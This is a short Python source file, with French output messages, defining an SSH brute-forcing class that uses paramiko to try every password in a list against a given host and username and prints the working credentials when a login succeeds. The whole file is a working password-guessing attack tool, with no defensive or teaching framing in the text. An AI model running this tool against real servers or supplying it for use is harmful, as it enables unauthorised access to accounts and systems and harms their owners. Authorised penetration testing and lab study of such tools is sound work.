import paramiko
from affichageprogression import display_progress

class SSHBruteForcer:
    def __init__(self, host, port, username, password_list):
        self.host = host
        self.port = port
        self.username = username
        self.password_list = password_list

    def attempt_login(self, password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(self.host, port=self.port, username=self.username, password=password)
            print("Connexion reussi ! ")
            print("Nom d'utilisateur : ", self.username)
            print("Mot de passe : ", password)
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            print(e)
            return False
        finally:
            ssh.close()

    def brute_force(self):
        total_attempts = len(self.password_list)
        for attempt, password in enumerate(self.password_list, start=1):
            if self.attempt_login(password):
                break
            display_progress(total_attempts, attempt)
